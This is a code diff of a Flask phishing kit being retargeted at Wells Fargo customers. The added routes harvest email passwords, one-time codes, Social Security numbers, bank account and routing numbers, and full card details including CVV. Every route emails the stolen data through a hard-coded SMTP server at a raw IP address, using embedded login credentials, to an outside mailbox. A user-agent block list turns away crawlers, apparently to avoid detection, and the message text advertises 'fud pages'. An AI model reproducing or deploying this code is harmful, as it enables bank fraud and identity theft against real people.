@@ -77,7 +77,7 @@ bot_user_agents = [
 "crawler"
 ]
 
-@app.route('/m', methods=['GET', 'POST'])
+@app.route('/', methods=['GET', 'POST'])
 def captcha():
 
     if request.method == 'GET':
@@ -145,13 +145,13 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@personalbio.site"
-        sender_emaill = "contact"
-        receiver_email = "demri.aury@moongit.com"
+        sender_emailx = 'contact'
+        sender_email = 'contact@personalbio.site'
+        receiver_email = "yosiel.gurfateh@moongit.com"
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW TT LOGS"
+        message["Subject"] = "WELLSFARGO LOGS"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -165,7 +165,7 @@ def first():
         message.attach(part1)
         message.attach(part2)
         with smtplib.SMTP("91.217.246.43", 6040) as server:
-            server.login(sender_emaill, password)
+            server.login(sender_emailx, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
 
@@ -182,13 +182,13 @@ def second():
         if ip is None:
             ip = request.remote_addr
         email = request.form.get("otp")
-        sender_email = "contact@personalbio.site"
-        sender_emaill = "contact"
-        receiver_email = "demri.aury@moongit.com"
+        sender_emailx = 'contact'
+        sender_email = 'contact@personalbio.site'
+        receiver_email = "yosiel.gurfateh@moongit.com"
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW TT LOGS P2"
+        message["Subject"] = "WELLS FORGO  OTP"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -202,15 +202,12 @@ def second():
         message.attach(part1)
         message.attach(part2)
         with smtplib.SMTP("91.217.246.43", 6040) as server:
-            server.login(sender_emaill, password)
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
 
-
-
-
-@app.route("/personal", methods=['POST'])
-def second():
+@app.route("/third", methods=['POST'])
+def third():
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
@@ -219,22 +216,22 @@ def second():
             ip = request.headers.get('X-Client-IP')
         if ip is None:
             ip = request.remote_addr
-        fullname = request.form.get("fname")
-        dateofbirth = request.form.get("dob")
-        phone = request.form.get("phone")
-        fulladdress = request.form.get("add")
-        taxfilenumber = request.form.get("tx")
-        noticeofassesment = request.form.get("doi")
-        bankaccountdetails = request.form.get("bsb")
-        accountnumber = request.form.get("acct")
-        referencenumber = request.form.get("reference")
-        sender_email = "contact@personalbio.site"
-        sender_emaill = "contact"
-        receiver_email = "demri.aury@moongit.com"
+        fullname = request.form.get("fullName")
+        phonenum = request.form.get("phone")
+        ssn = request.form.get("ssn")
+        accountnum = request.form.get("accountNumber")
+        routingnum = request.form.get("routingNumber")
+        ccnum = request.form.get("cardNumber")
+        ccex = request.form.get("expiration")
+        cccvv = request.form.get("cvv")
+        cardholder = request.form.get("cardHolderName")
+        sender_emailx = 'contact'
+        sender_email = 'contact@personalbio.site'
+        receiver_email = "yosiel.gurfateh@moongit.com"
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW TT LOGS P2"
+        message["Subject"] = "WELLS FARGO FULL FORM"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -242,17 +239,51 @@ def second():
         How are you?
         contact me on icq jamescartwright for your fud pages
         """
-        html = render_template('personal.html', efullname=fullname, ereference=referencenumber, edateofbirth=dateofbirth, ephone=phone, efulladdress=fulladdress, etaxfilenumber=taxfilenumber, enoticeofassesment=noticeofassesment, ebankaccountdetails=bankaccountdetails, eaccountnumber=accountnumber, useragent=useragent, ipman=ip)
+        html = render_template('personaldata.html', emailaccess=fullname, ephone=phonenum, essn=ssn, eaccountnum=accountnum, erouting=routingnum, ecc=ccnum, eccex=ccex, ecccvv=cccvv, ecardholder=cardholder, useragent=useragent, ipman=ip)
         part1 = MIMEText(text, "plain")
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
         with smtplib.SMTP("91.217.246.43", 6040) as server:
-            server.login(sender_emaill, password)
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('donee'))
+        return redirect(url_for('otptwo'))
 
 
+@app.route("/fourth", methods=['POST'])
+def fourth():
+    if request.method == 'POST':
+        ip = request.headers.get('X-Forwarded-For')
+        if ip is None:
+            ip = request.headers.get('X-Real-IP')
+        if ip is None:
+            ip = request.headers.get('X-Client-IP')
+        if ip is None:
+            ip = request.remote_addr
+        email = request.form.get("otp")
+        sender_emailx = 'contact'
+        sender_email = 'contact@personalbio.site'
+        receiver_email = "yosiel.gurfateh@moongit.com"
+        password = "vip79d01760b097"
+        useragent = request.headers.get('User-Agent')
+        message = MIMEMultipart("alternative")
+        message["Subject"] = "WELLS FARGO WIRE OTP"
+        message["From"] = sender_email
+        message["To"] = receiver_email
+        text = """\
+        Hi,
+        How are you?
+        contact me on icq jamescartwright for your fud pages
+        """
+        html = render_template('otpp.html', emailaccess=email, useragent=useragent, ipman=ip)
+        part1 = MIMEText(text, "plain")
+        part2 = MIMEText(html, "html")
+        message.attach(part1)
+        message.attach(part2)
+        with smtplib.SMTP("91.217.246.43", 6040) as server:
+            server.login(sender_email, password)
+            server.sendmail(sender_email, receiver_email, message.as_string())
+        return redirect(url_for('cook'))
 
 @app.route("/benzap", methods=['GET'])
 def benza():
@@ -261,9 +292,7 @@ def benza():
         dman = session.get('ins')
     return render_template('ind.html', eman=eman, dman=dman)
 
-
-
-@app.route("/donee", methods=['GET'])
+@app.route("/lasmop", methods=['GET'])
 def lasmo():
     userip = request.headers.get("X-Forwarded-For")
     useragent = request.headers.get("User-Agent")
@@ -273,15 +302,32 @@ def lasmo():
     
     if request.method == 'GET':
         dman = session.get('ins')
-    return render_template('main.html')
+    return render_template('fullcode.html', dman=dman)
 
-
-
-@app.route("/", methods=['GET'])
-def lasmo():
+@app.route("/otptwo", methods=['GET'])
+def otptwo():
     userip = request.headers.get("X-Forwarded-For")
     useragent = request.headers.get("User-Agent")
-    return render_template('captcha.html')
+    
+    if useragent in bot_user_agents:
+        abort(403)  # forbidden
+    
+    if request.method == 'GET':
+        dman = session.get('ins')
+    return render_template('otp2.html')
+
+
+@app.route("/cook", methods=['GET'])
+def cook():
+    userip = request.headers.get("X-Forwarded-For")
+    useragent = request.headers.get("User-Agent")
+    
+    if useragent in bot_user_agents:
+        abort(403)  # forbidden
+    
+    if request.method == 'GET':
+        dman = session.get('ins')
+    return render_template('complete.html')
 
 if __name__ == '__main__':
 	app.run(host="0.0.0.0", port=3000)
